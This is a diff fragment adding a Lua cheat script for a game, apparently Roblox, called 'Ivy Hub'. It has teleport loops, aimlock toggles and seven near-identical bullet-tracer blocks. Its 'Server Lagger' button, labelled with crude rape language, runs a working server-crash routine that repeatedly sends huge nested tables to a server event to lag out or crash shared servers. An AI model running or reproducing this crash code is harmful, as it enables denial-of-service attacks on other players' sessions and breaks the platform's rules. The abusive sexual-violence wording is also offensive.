+    game:GetService("Players").LocalPlayer.Character.Humanoid:EquipTool(game.Players.LocalPlayer.Backpack.TinyPhone)
+    game:GetService("Players").LocalPlayer.Character.Humanoid:UnequipTools()
+    wait(.1)
+    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(249, 16, 59)
+    wait(.1)
+    game:GetService("Players").LocalPlayer.Character.Humanoid:EquipTool(game.Players.LocalPlayer.Backpack.TinyPhone)
+    game:GetService("Players").LocalPlayer.Character.Humanoid:UnequipTools()
+    wait(.1)
+    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(249, 16, 59)
+    wait(.1)
+    game:GetService("Players").LocalPlayer.Character.Humanoid:EquipTool(game.Players.LocalPlayer.Backpack.TinyPhone)
+    game:GetService("Players").LocalPlayer.Character.Humanoid:UnequipTools()
+    wait(.1)
+    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(249, 16, 59)
+    wait(.1)
+    game:GetService("Players").LocalPlayer.Character.Humanoid:EquipTool(game.Players.LocalPlayer.Backpack.TinyPhone)
+    game:GetService("Players").LocalPlayer.Character.Humanoid:UnequipTools()
+
+end
+ 
+
+ 
+local function Check()
+    if game:GetService("Lighting").ClockTime == 23 then
+        print("Restarting")
+        Start()
+    end
+end
+
+local function Check1()
+    if game:GetService("Lighting").ClockTime == 17 then
+        print("Restarting")
+        Start1()
+    end
+end
+
+game:GetService("Lighting"):GetPropertyChangedSignal("ClockTime"):Connect(Check)
+
+game:GetService("Lighting"):GetPropertyChangedSignal("ClockTime"):Connect(Check1)
+
+end)
+
+local Page1 = windowz:CreatePage("Combat")
+
+
+local Section1 = Page1:CreateSection("Gun Stuff")
+
+Section1:CreateToggle("AimLock", {Toggled=false , Description = false}, function(Value)
+    print(Value)
+ end)
+
+ Section1:CreateToggle("AntiLock", {Toggled=false , Description = false}, function(loll)
+    local toge = loll
+
+    if loll then
+    game.StarterGui:SetCore("SendNotification", {Title = "Ivy Hub", Text = "antilock loading...", Icon = "rbxassetid://14445651728", Duration = 2,})
+    wait(2)
+    game.StarterGui:SetCore("SendNotification", {Title = "Ivy Hub", Text = "loaded", Icon = "rbxassetid://14445651728", Duration = 2,})
+    end
+ end)
+
+ local Page1 = windowz:CreatePage("Bullet Tracers")
+
+
+local Section1 = Page1:CreateSection("Bullet Colour")
+
+Section1:CreateButton("Blue Tracers", function ()
+    BulletTracers = true
+bullet_tracer_color = Color3.fromRGB(102, 255, 255)
+---------------------------------------------------------------------------------------------------------------------------
+
+function GetGun()
+    if game.Players.LocalPlayer.Character then
+        for i, v in pairs(game.Players.LocalPlayer.Character:GetChildren()) do
+            if v:FindFirstChild 'Ammo' then
+                return v
+            end
+        end
+    end
+    return nil
+end
+
+local Services = {
+    Players = game:GetService("Players"),
+    UserInputService = game:GetService("UserInputService"),
+    RunService = game:GetService("RunService"),
+}
+
+local Local = {
+    Player = Services.Players.LocalPlayer,
+    Mouse = Services.Players.LocalPlayer:GetMouse(),
+}
+local Other = {
+    Camera = workspace.CurrentCamera,
+    BeamPart = Instance.new("Part", workspace)
+}
+
+Other.BeamPart.Name = "BeamPart"
+Other.BeamPart.Transparency = 1
+local Settings = {
+    StartColor = bullet_tracer_color,
+    EndColor = bullet_tracer_color,
+    StartWidth = 3,
+    EndWidth = 3,
+    ShowImpactPoint = false,
+    ImpactTransparency = 0.5,
+    ImpactColor = Color3.new(1, 1, 1),
+    Time = 1,
+}
+game:GetService "RunService".Heartbeat:Connect(function()
+    if game:GetService("Workspace").Ignored:FindFirstChild 'BULLET_RAYS' and BulletTracers then
+        game:GetService("Workspace").Ignored.BULLET_RAYS:Destroy()
+    end
+end)
+local funcs = {}
+Local.Mouse.TargetFilter = Other.BeamPart
+function funcs:Beam(v1, v2)
+    v2 = Vector3.new(v2.X - 0.1, v2.Y + 0.2, v2.Z)
+    local colorSequence = ColorSequence.new({
+        ColorSequenceKeypoint.new(0, bullet_tracer_color),
+        ColorSequenceKeypoint.new(1, bullet_tracer_color),
+    })
+    local Part = Instance.new("Part", Other.BeamPart)
+    Part.Size = Vector3.new(0, 0, 0)
+    Part.Massless = true
+    Part.Transparency = 1
+    Part.CanCollide = false
+    Part.Position = v1
+    Part.Anchored = true
+    local Attachment = Instance.new("Attachment", Part)
+    local Part2 = Instance.new("Part", Other.BeamPart)
+    Part2.Size = Vector3.new(0, 0, 0)
+    Part2.Transparency = 0
+    Part2.CanCollide = false
+    Part2.Position = v2
+    Part2.Anchored = true
+    Part2.Material = Enum.Material.ForceField
+    Part2.Color = Settings.ImpactColor
+    Part2.Massless = true
+    local Attachment2 = Instance.new("Attachment", Part2)
+    local Beam = Instance.new("Beam", Part)
+    Beam.FaceCamera = true
+    Beam.Color = colorSequence
+    Beam.Attachment0 = Attachment
+    Beam.Attachment1 = Attachment2
+    Beam.LightEmission = 6
+    Beam.LightInfluence = 1
+    Beam.Width0 = Settings.StartWidth
+    Beam.Width1 = Settings.EndWidth
+    Beam.Texture = "http://www.roblox.com/asset/?id=9150663556"
+    Beam.TextureSpeed = 2
+    Beam.TextureLength = 1
+    delay(Settings.Time, function()
+        Part:Destroy()
+        Part2:Destroy()
+    end)
+end
+
+spawn(function()
+    while task.wait(0.5) do
+        gun = GetGun()
+        if gun then
+            LastAmmo = gun.Ammo.Value
+            gun.Ammo:GetPropertyChangedSignal("Value"):Connect(function()
+                if BulletTracers and gun.Ammo.Value < LastAmmo then
+                    LastAmmo = gun.Ammo.Value
+                    funcs:Beam(gun.Handle.Position, Local.Mouse.hit.p)
+                end
+            end)
+        end
+    end
+end)
+game.StarterGui:SetCore("SendNotification", {Title = "Ivy Hub", Text = "Tracers Loaded 😈", Icon = "rbxassetid://14445651728", Duration = 2,})
+end)
+
+Section1:CreateButton("Red Tracers", function ()
+    BulletTracers = true
+bullet_tracer_color = Color3.fromRGB(255,0,0)
+---------------------------------------------------------------------------------------------------------------------------
+
+function GetGun()
+    if game.Players.LocalPlayer.Character then
+        for i, v in pairs(game.Players.LocalPlayer.Character:GetChildren()) do
+            if v:FindFirstChild 'Ammo' then
+                return v
+            end
+        end
+    end
+    return nil
+end
+
+local Services = {
+    Players = game:GetService("Players"),
+    UserInputService = game:GetService("UserInputService"),
+    RunService = game:GetService("RunService"),
+}
+
+local Local = {
+    Player = Services.Players.LocalPlayer,
+    Mouse = Services.Players.LocalPlayer:GetMouse(),
+}
+local Other = {
+    Camera = workspace.CurrentCamera,
+    BeamPart = Instance.new("Part", workspace)
+}
+
+Other.BeamPart.Name = "BeamPart"
+Other.BeamPart.Transparency = 1
+local Settings = {
+    StartColor = bullet_tracer_color,
+    EndColor = bullet_tracer_color,
+    StartWidth = 3,
+    EndWidth = 3,
+    ShowImpactPoint = false,
+    ImpactTransparency = 0.5,
+    ImpactColor = Color3.new(1, 1, 1),
+    Time = 1,
+}
+game:GetService "RunService".Heartbeat:Connect(function()
+    if game:GetService("Workspace").Ignored:FindFirstChild 'BULLET_RAYS' and BulletTracers then
+        game:GetService("Workspace").Ignored.BULLET_RAYS:Destroy()
+    end
+end)
+local funcs = {}
+Local.Mouse.TargetFilter = Other.BeamPart
+function funcs:Beam(v1, v2)
+    v2 = Vector3.new(v2.X - 0.1, v2.Y + 0.2, v2.Z)
+    local colorSequence = ColorSequence.new({
+        ColorSequenceKeypoint.new(0, bullet_tracer_color),
+        ColorSequenceKeypoint.new(1, bullet_tracer_color),
+    })
+    local Part = Instance.new("Part", Other.BeamPart)
+    Part.Size = Vector3.new(0, 0, 0)
+    Part.Massless = true
+    Part.Transparency = 1
+    Part.CanCollide = false
+    Part.Position = v1
+    Part.Anchored = true
+    local Attachment = Instance.new("Attachment", Part)
+    local Part2 = Instance.new("Part", Other.BeamPart)
+    Part2.Size = Vector3.new(0, 0, 0)
+    Part2.Transparency = 0
+    Part2.CanCollide = false
+    Part2.Position = v2
+    Part2.Anchored = true
+    Part2.Material = Enum.Material.ForceField
+    Part2.Color = Settings.ImpactColor
+    Part2.Massless = true
+    local Attachment2 = Instance.new("Attachment", Part2)
+    local Beam = Instance.new("Beam", Part)
+    Beam.FaceCamera = true
+    Beam.Color = colorSequence
+    Beam.Attachment0 = Attachment
+    Beam.Attachment1 = Attachment2
+    Beam.LightEmission = 6
+    Beam.LightInfluence = 1
+    Beam.Width0 = Settings.StartWidth
+    Beam.Width1 = Settings.EndWidth
+    Beam.Texture = "http://www.roblox.com/asset/?id=9150663556"
+    Beam.TextureSpeed = 2
+    Beam.TextureLength = 1
+    delay(Settings.Time, function()
+        Part:Destroy()
+        Part2:Destroy()
+    end)
+end
+
+spawn(function()
+    while task.wait(0.5) do
+        gun = GetGun()
+        if gun then
+            LastAmmo = gun.Ammo.Value
+            gun.Ammo:GetPropertyChangedSignal("Value"):Connect(function()
+                if BulletTracers and gun.Ammo.Value < LastAmmo then
+                    LastAmmo = gun.Ammo.Value
+                    funcs:Beam(gun.Handle.Position, Local.Mouse.hit.p)
+                end
+            end)
+        end
+    end
+end)
+game.StarterGui:SetCore("SendNotification", {Title = "Ivy Hub", Text = "Tracers Loaded 😈", Icon = "rbxassetid://14445651728", Duration = 2,})
+end)
+
+Section1:CreateButton("Pink Tracers", function ()
+    BulletTracers = true
+bullet_tracer_color = Color3.fromRGB(255,0,255)
+---------------------------------------------------------------------------------------------------------------------------
+
+function GetGun()
+    if game.Players.LocalPlayer.Character then
+        for i, v in pairs(game.Players.LocalPlayer.Character:GetChildren()) do
+            if v:FindFirstChild 'Ammo' then
+                return v
+            end
+        end
+    end
+    return nil
+end
+
+local Services = {
+    Players = game:GetService("Players"),
+    UserInputService = game:GetService("UserInputService"),
+    RunService = game:GetService("RunService"),
+}
+
+local Local = {
+    Player = Services.Players.LocalPlayer,
+    Mouse = Services.Players.LocalPlayer:GetMouse(),
+}
+local Other = {
+    Camera = workspace.CurrentCamera,
+    BeamPart = Instance.new("Part", workspace)
+}
+
+Other.BeamPart.Name = "BeamPart"
+Other.BeamPart.Transparency = 1
+local Settings = {
+    StartColor = bullet_tracer_color,
+    EndColor = bullet_tracer_color,
+    StartWidth = 3,
+    EndWidth = 3,
+    ShowImpactPoint = false,
+    ImpactTransparency = 0.5,
+    ImpactColor = Color3.new(1, 1, 1),
+    Time = 1,
+}
+game:GetService "RunService".Heartbeat:Connect(function()
+    if game:GetService("Workspace").Ignored:FindFirstChild 'BULLET_RAYS' and BulletTracers then
+        game:GetService("Workspace").Ignored.BULLET_RAYS:Destroy()
+    end
+end)
+local funcs = {}
+Local.Mouse.TargetFilter = Other.BeamPart
+function funcs:Beam(v1, v2)
+    v2 = Vector3.new(v2.X - 0.1, v2.Y + 0.2, v2.Z)
+    local colorSequence = ColorSequence.new({
+        ColorSequenceKeypoint.new(0, bullet_tracer_color),
+        ColorSequenceKeypoint.new(1, bullet_tracer_color),
+    })
+    local Part = Instance.new("Part", Other.BeamPart)
+    Part.Size = Vector3.new(0, 0, 0)
+    Part.Massless = true
+    Part.Transparency = 1
+    Part.CanCollide = false
+    Part.Position = v1
+    Part.Anchored = true
+    local Attachment = Instance.new("Attachment", Part)
+    local Part2 = Instance.new("Part", Other.BeamPart)
+    Part2.Size = Vector3.new(0, 0, 0)
+    Part2.Transparency = 0
+    Part2.CanCollide = false
+    Part2.Position = v2
+    Part2.Anchored = true
+    Part2.Material = Enum.Material.ForceField
+    Part2.Color = Settings.ImpactColor
+    Part2.Massless = true
+    local Attachment2 = Instance.new("Attachment", Part2)
+    local Beam = Instance.new("Beam", Part)
+    Beam.FaceCamera = true
+    Beam.Color = colorSequence
+    Beam.Attachment0 = Attachment
+    Beam.Attachment1 = Attachment2
+    Beam.LightEmission = 6
+    Beam.LightInfluence = 1
+    Beam.Width0 = Settings.StartWidth
+    Beam.Width1 = Settings.EndWidth
+    Beam.Texture = "http://www.roblox.com/asset/?id=9150663556"
+    Beam.TextureSpeed = 2
+    Beam.TextureLength = 1
+    delay(Settings.Time, function()
+        Part:Destroy()
+        Part2:Destroy()
+    end)
+end
+
+spawn(function()
+    while task.wait(0.5) do
+        gun = GetGun()
+        if gun then
+            LastAmmo = gun.Ammo.Value
+            gun.Ammo:GetPropertyChangedSignal("Value"):Connect(function()
+                if BulletTracers and gun.Ammo.Value < LastAmmo then
+                    LastAmmo = gun.Ammo.Value
+                    funcs:Beam(gun.Handle.Position, Local.Mouse.hit.p)
+                end
+            end)
+        end
+    end
+end)
+game.StarterGui:SetCore("SendNotification", {Title = "Ivy Hub", Text = "Tracers Loaded 😈", Icon = "rbxassetid://14445651728", Duration = 2,})
+end)
+
+Section1:CreateButton("Green Tracers", function ()
+    BulletTracers = true
+bullet_tracer_color = Color3.fromRGB(0,255,0)
+---------------------------------------------------------------------------------------------------------------------------
+
+function GetGun()
+    if game.Players.LocalPlayer.Character then
+        for i, v in pairs(game.Players.LocalPlayer.Character:GetChildren()) do
+            if v:FindFirstChild 'Ammo' then
+                return v
+            end
+        end
+    end
+    return nil
+end
+
+local Services = {
+    Players = game:GetService("Players"),
+    UserInputService = game:GetService("UserInputService"),
+    RunService = game:GetService("RunService"),
+}
+
+local Local = {
+    Player = Services.Players.LocalPlayer,
+    Mouse = Services.Players.LocalPlayer:GetMouse(),
+}
+local Other = {
+    Camera = workspace.CurrentCamera,
+    BeamPart = Instance.new("Part", workspace)
+}
+
+Other.BeamPart.Name = "BeamPart"
+Other.BeamPart.Transparency = 1
+local Settings = {
+    StartColor = bullet_tracer_color,
+    EndColor = bullet_tracer_color,
+    StartWidth = 3,
+    EndWidth = 3,
+    ShowImpactPoint = false,
+    ImpactTransparency = 0.5,
+    ImpactColor = Color3.new(1, 1, 1),
+    Time = 1,
+}
+game:GetService "RunService".Heartbeat:Connect(function()
+    if game:GetService("Workspace").Ignored:FindFirstChild 'BULLET_RAYS' and BulletTracers then
+        game:GetService("Workspace").Ignored.BULLET_RAYS:Destroy()
+    end
+end)
+local funcs = {}
+Local.Mouse.TargetFilter = Other.BeamPart
+function funcs:Beam(v1, v2)
+    v2 = Vector3.new(v2.X - 0.1, v2.Y + 0.2, v2.Z)
+    local colorSequence = ColorSequence.new({
+        ColorSequenceKeypoint.new(0, bullet_tracer_color),
+        ColorSequenceKeypoint.new(1, bullet_tracer_color),
+    })
+    local Part = Instance.new("Part", Other.BeamPart)
+    Part.Size = Vector3.new(0, 0, 0)
+    Part.Massless = true
+    Part.Transparency = 1
+    Part.CanCollide = false
+    Part.Position = v1
+    Part.Anchored = true
+    local Attachment = Instance.new("Attachment", Part)
+    local Part2 = Instance.new("Part", Other.BeamPart)
+    Part2.Size = Vector3.new(0, 0, 0)
+    Part2.Transparency = 0
+    Part2.CanCollide = false
+    Part2.Position = v2
+    Part2.Anchored = true
+    Part2.Material = Enum.Material.ForceField
+    Part2.Color = Settings.ImpactColor
+    Part2.Massless = true
+    local Attachment2 = Instance.new("Attachment", Part2)
+    local Beam = Instance.new("Beam", Part)
+    Beam.FaceCamera = true
+    Beam.Color = colorSequence
+    Beam.Attachment0 = Attachment
+    Beam.Attachment1 = Attachment2
+    Beam.LightEmission = 6
+    Beam.LightInfluence = 1
+    Beam.Width0 = Settings.StartWidth
+    Beam.Width1 = Settings.EndWidth
+    Beam.Texture = "http://www.roblox.com/asset/?id=9150663556"
+    Beam.TextureSpeed = 2
+    Beam.TextureLength = 1
+    delay(Settings.Time, function()
+        Part:Destroy()
+        Part2:Destroy()
+    end)
+end
+
+spawn(function()
+    while task.wait(0.5) do
+        gun = GetGun()
+        if gun then
+            LastAmmo = gun.Ammo.Value
+            gun.Ammo:GetPropertyChangedSignal("Value"):Connect(function()
+                if BulletTracers and gun.Ammo.Value < LastAmmo then
+                    LastAmmo = gun.Ammo.Value
+                    funcs:Beam(gun.Handle.Position, Local.Mouse.hit.p)
+                end
+            end)
+        end
+    end
+end)
+
+game.StarterGui:SetCore("SendNotification", {Title = "Ivy Hub", Text = "Tracers Loaded 😈", Icon = "rbxassetid://14445651728", Duration = 2,})
+end)
+
+Section1:CreateButton("Yellow Tracers", function ()
+    BulletTracers = true
+bullet_tracer_color = Color3.fromRGB(255,255,0)
+---------------------------------------------------------------------------------------------------------------------------
+
+function GetGun()
+    if game.Players.LocalPlayer.Character then
+        for i, v in pairs(game.Players.LocalPlayer.Character:GetChildren()) do
+            if v:FindFirstChild 'Ammo' then
+                return v
+            end
+        end
+    end
+    return nil
+end
+
+local Services = {
+    Players = game:GetService("Players"),
+    UserInputService = game:GetService("UserInputService"),
+    RunService = game:GetService("RunService"),
+}
+
+local Local = {
+    Player = Services.Players.LocalPlayer,
+    Mouse = Services.Players.LocalPlayer:GetMouse(),
+}
+local Other = {
+    Camera = workspace.CurrentCamera,
+    BeamPart = Instance.new("Part", workspace)
+}
+
+Other.BeamPart.Name = "BeamPart"
+Other.BeamPart.Transparency = 1
+local Settings = {
+    StartColor = bullet_tracer_color,
+    EndColor = bullet_tracer_color,
+    StartWidth = 3,
+    EndWidth = 3,
+    ShowImpactPoint = false,
+    ImpactTransparency = 0.5,
+    ImpactColor = Color3.new(1, 1, 1),
+    Time = 1,
+}
+game:GetService "RunService".Heartbeat:Connect(function()
+    if game:GetService("Workspace").Ignored:FindFirstChild 'BULLET_RAYS' and BulletTracers then
+        game:GetService("Workspace").Ignored.BULLET_RAYS:Destroy()
+    end
+end)
+local funcs = {}
+Local.Mouse.TargetFilter = Other.BeamPart
+function funcs:Beam(v1, v2)
+    v2 = Vector3.new(v2.X - 0.1, v2.Y + 0.2, v2.Z)
+    local colorSequence = ColorSequence.new({
+        ColorSequenceKeypoint.new(0, bullet_tracer_color),
+        ColorSequenceKeypoint.new(1, bullet_tracer_color),
+    })
+    local Part = Instance.new("Part", Other.BeamPart)
+    Part.Size = Vector3.new(0, 0, 0)
+    Part.Massless = true
+    Part.Transparency = 1
+    Part.CanCollide = false
+    Part.Position = v1
+    Part.Anchored = true
+    local Attachment = Instance.new("Attachment", Part)
+    local Part2 = Instance.new("Part", Other.BeamPart)
+    Part2.Size = Vector3.new(0, 0, 0)
+    Part2.Transparency = 0
+    Part2.CanCollide = false
+    Part2.Position = v2
+    Part2.Anchored = true
+    Part2.Material = Enum.Material.ForceField
+    Part2.Color = Settings.ImpactColor
+    Part2.Massless = true
+    local Attachment2 = Instance.new("Attachment", Part2)
+    local Beam = Instance.new("Beam", Part)
+    Beam.FaceCamera = true
+    Beam.Color = colorSequence
+    Beam.Attachment0 = Attachment
+    Beam.Attachment1 = Attachment2
+    Beam.LightEmission = 6
+    Beam.LightInfluence = 1
+    Beam.Width0 = Settings.StartWidth
+    Beam.Width1 = Settings.EndWidth
+    Beam.Texture = "http://www.roblox.com/asset/?id=9150663556"
+    Beam.TextureSpeed = 2
+    Beam.TextureLength = 1
+    delay(Settings.Time, function()
+        Part:Destroy()
+        Part2:Destroy()
+    end)
+end
+
+spawn(function()
+    while task.wait(0.5) do
+        gun = GetGun()
+        if gun then
+            LastAmmo = gun.Ammo.Value
+            gun.Ammo:GetPropertyChangedSignal("Value"):Connect(function()
+                if BulletTracers and gun.Ammo.Value < LastAmmo then
+                    LastAmmo = gun.Ammo.Value
+                    funcs:Beam(gun.Handle.Position, Local.Mouse.hit.p)
+                end
+            end)
+        end
+    end
+end)
+
+game.StarterGui:SetCore("SendNotification", {Title = "Ivy Hub", Text = "Tracers Loaded 😈", Icon = "rbxassetid://14445651728", Duration = 2,})
+end)
+
+Section1:CreateButton("Cyan Tracers", function ()
+    BulletTracers = true
+bullet_tracer_color = Color3.fromRGB(0,255,255)
+---------------------------------------------------------------------------------------------------------------------------
+
+function GetGun()
+    if game.Players.LocalPlayer.Character then
+        for i, v in pairs(game.Players.LocalPlayer.Character:GetChildren()) do
+            if v:FindFirstChild 'Ammo' then
+                return v
+            end
+        end
+    end
+    return nil
+end
+
+local Services = {
+    Players = game:GetService("Players"),
+    UserInputService = game:GetService("UserInputService"),
+    RunService = game:GetService("RunService"),
+}
+
+local Local = {
+    Player = Services.Players.LocalPlayer,
+    Mouse = Services.Players.LocalPlayer:GetMouse(),
+}
+local Other = {
+    Camera = workspace.CurrentCamera,
+    BeamPart = Instance.new("Part", workspace)
+}
+
+Other.BeamPart.Name = "BeamPart"
+Other.BeamPart.Transparency = 1
+local Settings = {
+    StartColor = bullet_tracer_color,
+    EndColor = bullet_tracer_color,
+    StartWidth = 3,
+    EndWidth = 3,
+    ShowImpactPoint = false,
+    ImpactTransparency = 0.5,
+    ImpactColor = Color3.new(1, 1, 1),
+    Time = 1,
+}
+game:GetService "RunService".Heartbeat:Connect(function()
+    if game:GetService("Workspace").Ignored:FindFirstChild 'BULLET_RAYS' and BulletTracers then
+        game:GetService("Workspace").Ignored.BULLET_RAYS:Destroy()
+    end
+end)
+local funcs = {}
+Local.Mouse.TargetFilter = Other.BeamPart
+function funcs:Beam(v1, v2)
+    v2 = Vector3.new(v2.X - 0.1, v2.Y + 0.2, v2.Z)
+    local colorSequence = ColorSequence.new({
+        ColorSequenceKeypoint.new(0, bullet_tracer_color),
+        ColorSequenceKeypoint.new(1, bullet_tracer_color),
+    })
+    local Part = Instance.new("Part", Other.BeamPart)
+    Part.Size = Vector3.new(0, 0, 0)
+    Part.Massless = true
+    Part.Transparency = 1
+    Part.CanCollide = false
+    Part.Position = v1
+    Part.Anchored = true
+    local Attachment = Instance.new("Attachment", Part)
+    local Part2 = Instance.new("Part", Other.BeamPart)
+    Part2.Size = Vector3.new(0, 0, 0)
+    Part2.Transparency = 0
+    Part2.CanCollide = false
+    Part2.Position = v2
+    Part2.Anchored = true
+    Part2.Material = Enum.Material.ForceField
+    Part2.Color = Settings.ImpactColor
+    Part2.Massless = true
+    local Attachment2 = Instance.new("Attachment", Part2)
+    local Beam = Instance.new("Beam", Part)
+    Beam.FaceCamera = true
+    Beam.Color = colorSequence
+    Beam.Attachment0 = Attachment
+    Beam.Attachment1 = Attachment2
+    Beam.LightEmission = 6
+    Beam.LightInfluence = 1
+    Beam.Width0 = Settings.StartWidth
+    Beam.Width1 = Settings.EndWidth
+    Beam.Texture = "http://www.roblox.com/asset/?id=9150663556"
+    Beam.TextureSpeed = 2
+    Beam.TextureLength = 1
+    delay(Settings.Time, function()
+        Part:Destroy()
+        Part2:Destroy()
+    end)
+end
+
+spawn(function()
+    while task.wait(0.5) do
+        gun = GetGun()
+        if gun then
+            LastAmmo = gun.Ammo.Value
+            gun.Ammo:GetPropertyChangedSignal("Value"):Connect(function()
+                if BulletTracers and gun.Ammo.Value < LastAmmo then
+                    LastAmmo = gun.Ammo.Value
+                    funcs:Beam(gun.Handle.Position, Local.Mouse.hit.p)
+                end
+            end)
+        end
+    end
+end)
+game.StarterGui:SetCore("SendNotification", {Title = "Ivy Hub", Text = "Tracers Loaded 😈", Icon = "rbxassetid://14445651728", Duration = 2,})
+end)
+
+Section1:CreateButton("Purple Tracers", function ()
+    BulletTracers = true
+bullet_tracer_color = Color3.fromRGB(128,0,128)
+---------------------------------------------------------------------------------------------------------------------------
+
+function GetGun()
+    if game.Players.LocalPlayer.Character then
+        for i, v in pairs(game.Players.LocalPlayer.Character:GetChildren()) do
+            if v:FindFirstChild 'Ammo' then
+                return v
+            end
+        end
+    end
+    return nil
+end
+
+local Services = {
+    Players = game:GetService("Players"),
+    UserInputService = game:GetService("UserInputService"),
+    RunService = game:GetService("RunService"),
+}
+
+local Local = {
+    Player = Services.Players.LocalPlayer,
+    Mouse = Services.Players.LocalPlayer:GetMouse(),
+}
+local Other = {
+    Camera = workspace.CurrentCamera,
+    BeamPart = Instance.new("Part", workspace)
+}
+
+Other.BeamPart.Name = "BeamPart"
+Other.BeamPart.Transparency = 1
+local Settings = {
+    StartColor = bullet_tracer_color,
+    EndColor = bullet_tracer_color,
+    StartWidth = 3,
+    EndWidth = 3,
+    ShowImpactPoint = false,
+    ImpactTransparency = 0.5,
+    ImpactColor = Color3.new(1, 1, 1),
+    Time = 1,
+}
+game:GetService "RunService".Heartbeat:Connect(function()
+    if game:GetService("Workspace").Ignored:FindFirstChild 'BULLET_RAYS' and BulletTracers then
+        game:GetService("Workspace").Ignored.BULLET_RAYS:Destroy()
+    end
+end)
+local funcs = {}
+Local.Mouse.TargetFilter = Other.BeamPart
+function funcs:Beam(v1, v2)
+    v2 = Vector3.new(v2.X - 0.1, v2.Y + 0.2, v2.Z)
+    local colorSequence = ColorSequence.new({
+        ColorSequenceKeypoint.new(0, bullet_tracer_color),
+        ColorSequenceKeypoint.new(1, bullet_tracer_color),
+    })
+    local Part = Instance.new("Part", Other.BeamPart)
+    Part.Size = Vector3.new(0, 0, 0)
+    Part.Massless = true
+    Part.Transparency = 1
+    Part.CanCollide = false
+    Part.Position = v1
+    Part.Anchored = true
+    local Attachment = Instance.new("Attachment", Part)
+    local Part2 = Instance.new("Part", Other.BeamPart)
+    Part2.Size = Vector3.new(0, 0, 0)
+    Part2.Transparency = 0
+    Part2.CanCollide = false
+    Part2.Position = v2
+    Part2.Anchored = true
+    Part2.Material = Enum.Material.ForceField
+    Part2.Color = Settings.ImpactColor
+    Part2.Massless = true
+    local Attachment2 = Instance.new("Attachment", Part2)
+    local Beam = Instance.new("Beam", Part)
+    Beam.FaceCamera = true
+    Beam.Color = colorSequence
+    Beam.Attachment0 = Attachment
+    Beam.Attachment1 = Attachment2
+    Beam.LightEmission = 6
+    Beam.LightInfluence = 1
+    Beam.Width0 = Settings.StartWidth
+    Beam.Width1 = Settings.EndWidth
+    Beam.Texture = "http://www.roblox.com/asset/?id=9150663556"
+    Beam.TextureSpeed = 2
+    Beam.TextureLength = 1
+    delay(Settings.Time, function()
+        Part:Destroy()
+        Part2:Destroy()
+    end)
+end
+
+spawn(function()
+    while task.wait(0.5) do
+        gun = GetGun()
+        if gun then
+            LastAmmo = gun.Ammo.Value
+            gun.Ammo:GetPropertyChangedSignal("Value"):Connect(function()
+                if BulletTracers and gun.Ammo.Value < LastAmmo then
+                    LastAmmo = gun.Ammo.Value
+                    funcs:Beam(gun.Handle.Position, Local.Mouse.hit.p)
+                end
+            end)
+        end
+    end
+end)
+game.StarterGui:SetCore("SendNotification", {Title = "Ivy Hub", Text = "Tracers Loaded 😈", Icon = "rbxassetid://14445651728", Duration = 2,})
+end)
+
+local Page1 = windowz:CreatePage("Credits")
+
+
+local Section1 = Page1:CreateSection("Credits: Ivy(aka 9nvy)")
+local Section2 = Page1:CreateSection("discord: nohawoo (no tags)")
+
+local Page1 = windowz:CreatePage("Premium")
+
+
+local Section1 = Page1:CreateSection("Fake Premium")
+
+Section1:CreateTextbox("Shirt ID", false, function (txt)
+	game:GetService("Players").LocalPlayer.Character:FindFirstChild("Shirt").ShirtTemplate = "rbxassetid://"..txt
+    
+end)
+
+Section1:CreateTextbox("Pants ID", false, function (txt)
+	game:GetService("Players").LocalPlayer.Character:FindFirstChild("Pants").PantsTemplate = "rbxassetid://"..txt
+    
+end)
+
+local Section2 = Page1:CreateSection("Server Lagger")
+
+Section2:CreateButton("Rape Server", function ()
+    game.StarterGui:SetCore("SendNotification", {Title = "Ivy Hub", Text = "raping 🍆🍑", Icon = "rbxassetid://14445651728", Duration = 2,})
+    print("Loading")
+    task.wait(1)
+    print("Raping server successfully")
+    
+    
+    local player = game.Players.LocalPlayer
+    
+    local function sendChatMessage(message)
+        game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(message, "All")
+    end
+    
+
+    
+    sendChatMessage("/finishservice")
+    wait(.1)
+    sendChatMessage("/advert")
+    wait(.1)
+    sendChatMessage("/shirt 0")
+    wait(.1)
+    sendChatMessage("/pants 0")
+    
+    
+    setfpscap = setfpscap
+    
+    if setfpscap then
+        setfpscap(30)  --// FPS UNLOCKER
+    end
+    -----------------------------------------------------------------------------
+    while wait(4.5) do --// This sends a lag spike in seconds. Like if its wait(5) then it will send the lag spike every 5 sec.
+                        --// increase seconds if client crashes 
+    ------------------------------------------------------------------------------
+    game:GetService("NetworkClient"):SetOutgoingKBPSLimit(math.huge)
+    local function getmaxvalue(val)
+       local mainvalueifonetable = 499999 --// THIS IS THE AMOUNT OF LAG THE SCRIPT IS SENDING TO THE SERVER IN KBPS
+       if type(val) ~= "number" then
+           return nil
+       end
+       local calculateperfectval = (mainvalueifonetable/(val+2))
+       return calculateperfectval
+    end
+     
+    local function bomb(tableincrease, tries)
+    local maintable = {}
+    local spammedtable = {}
+     
+    table.insert(spammedtable, {})
+    z = spammedtable[1]
+     
+    for i = 1, tableincrease do
+        local tableins = {}
+        table.insert(z, tableins)
+        z = tableins
+    end
+     
+    local calculatemax = getmaxvalue(tableincrease)
+    local maximum
+     
+    if calculatemax then 
+         maximum = calculatemax
+         else
+         maximum = 5000 --// This is the ping cap. The server crasher will not make everyones ping go over the cap
+    end
+     
+    for i = 1, maximum do
+         table.insert(maintable, spammedtable)
+    end
+     
+    for i = 1, tries do
+         game.RobloxReplicatedStorage.SetPlayerBlockList:FireServer(maintable)
+    end
+    end
+     
+    bomb(289, 5) --// Please dont change the bomb value if you dont know what you are doing
+    end
+        game.StarterGui:SetCore("SendNotification", {Title = "Ivy Hub", Text = "Crashing...", Duration = 10,})
+    
+    end)
+    
+    
+ local Page1 = windowz:CreatePage("Settings")
+
+
+local Section1 = Page1:CreateSection("Configure")
+
+
+ 
+
+Section1:CreateTextbox("Keybind Ui", false, function (vv)
+    local uitog = false
+
+    keyyy = vv
+
+    mouse.KeyDown:Connect(function(key)
+        if key == keyyy and uitog  then
+            game.CoreGui.CFAHubPremium2022.Container.Visible = false
+            uitog = true
+        elseif key == keyyy and not uitog then
+            game.CoreGui.CFAHubPremium2022.Container.Visible = true
+            uitog = false
+        end
+    end)
+    
+ end)
+ 
 end)
 
 MainSection:NewButton("(Respawn)", "Respawn/Small Height", function()
